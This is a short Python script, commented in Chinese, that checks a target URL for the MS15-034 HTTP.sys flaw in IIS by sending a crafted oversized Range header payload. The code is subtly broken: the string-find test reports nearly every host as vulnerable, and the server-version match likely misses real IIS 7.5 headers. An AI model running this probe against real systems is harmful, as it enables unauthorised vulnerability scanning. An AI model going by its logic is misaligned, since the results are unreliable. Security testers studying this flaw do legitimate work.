import requests
#url位置填写指定ip
url = ""
r = requests.get(url)
remote_server = r.headers['server']

if remote_server and (remote_server.find("IIS7.5") != -1 or remote_server.find("IIS/8.0") != -1):
    #Host: stuff\r\nRange: bytes=0-18446744073709551615 这个是漏洞发现的证明
    payload = {'Host': 'stuff', 'Range': 'bytes=0-18446744073709551615'}
    r1 = requests.get(url, headers=payload)
    print(r1.request.headers)
    print(r1.content)
    if str(r1.content).find("Requested Range Not Satisfiable"):
        print(url + " 存在 vuln ms15-034")
    else:
        print(url + " 不存在 vuln ms15-034")
else:
    print("不存在 iis 7.5 or iis 8.0")
